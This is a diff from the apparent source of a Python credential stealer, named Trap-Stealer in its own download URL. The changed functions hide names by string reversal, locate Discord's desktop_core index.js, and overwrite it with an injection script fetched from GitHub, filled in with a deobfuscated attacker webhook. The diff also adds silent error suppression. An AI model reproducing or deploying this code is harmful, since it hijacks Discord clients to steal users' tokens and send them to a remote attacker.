@@ -396,37 +396,44 @@ Dscdev = 'tnempoleveDdrocsiD'[::-1]
 
 from urllib.request import urlopen
 def NoDiscord():
-    ind = "sj.xedni"
-    folder_list = [f'{Desc}', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
-    for folder_name in folder_list:
-        folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
-        if os.path.isdir(folder_path):
-            for root, dirs, files in os.walk(folder_path):
-                for file in files:
-                    if file == f'{ind[::-1]}' and 'discord_desktop_core-' in root:
-                        file_path = os.path.join(root, file)
-                        with open(file_path, "w+", encoding="utf-8") as f:
-                            f.write('error')
+    try:
+            
+        ind = "sj.xedni"
+        folder_list = [f'{Desc}', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
+        for folder_name in folder_list:
+            folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
+            if os.path.isdir(folder_path):
+                for root, dirs, files in os.walk(folder_path):
+                    for file in files:
+                        if file == f'{ind[::-1]}' and 'discord_desktop_core-' in root:
+                            file_path = os.path.join(root, file)
+                            with open(file_path, "w+", encoding="utf-8") as f:
+                                f.write('error')
 
+    except:
+        pass
 def idisc():
-    ind = "sj.xedni"
-    global webhook
+    try:
+        ind = "sj.xedni"
+        global webhook
 
-    inj_url = f"https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/{ind[::-1]}"
+        inj_url = f"https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/{ind[::-1]}"
 
-    folder_list = [f'{Desc}', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
-    for folder_name in folder_list:
-        folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
-        if os.path.isdir(folder_path):
-            for root, dirs, files in os.walk(folder_path):
-                for file in files:
-                    if file == f'{ind[::-1]}' and 'discord_desktop_core-' in root:
-                        file_path = os.path.join(root, file)
-                        hook = deobf(webhook[0],webhook[1]).decode()
-                        webhook = str(hook)
-                        inj_content = urlopen(inj_url).read().decode().replace("%WEBHOOK%", webhook)
-                        with open(file_path, "w", encoding="utf-8") as f:
-                            f.write(inj_content)
+        folder_list = [f'{Desc}', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
+        for folder_name in folder_list:
+            folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
+            if os.path.isdir(folder_path):
+                for root, dirs, files in os.walk(folder_path):
+                    for file in files:
+                        if file == f'{ind[::-1]}' and 'discord_desktop_core-' in root:
+                            file_path = os.path.join(root, file)
+                            hook = deobf(webhook[0],webhook[1]).decode()
+                            webhook = str(hook)
+                            inj_content = urlopen(inj_url).read().decode().replace("%WEBHOOK%", webhook)
+                            with open(file_path, "w", encoding="utf-8") as f:
+                                f.write(inj_content)
+    except: 
+        pass
 
 pas = 'drowssaP'
 def systemInfo():
